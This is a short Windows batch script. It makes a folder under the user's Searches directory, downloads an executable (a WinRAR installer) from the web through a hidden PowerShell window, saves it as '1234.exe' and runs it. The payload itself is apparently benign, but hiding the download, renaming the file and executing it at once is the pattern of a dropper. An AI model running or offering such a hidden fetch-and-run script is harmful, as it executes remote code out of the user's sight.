@ECHO OFF
cd \
cd %userprofile%
cd Searches
mkdir 123
cd 123 
powershell.exe -windowstyle hidden Invoke-WebRequest -OutFile 1234.exe -Uri https://www.rarlab.com/rar/winrar-x64-561.exe
.\1234.exe
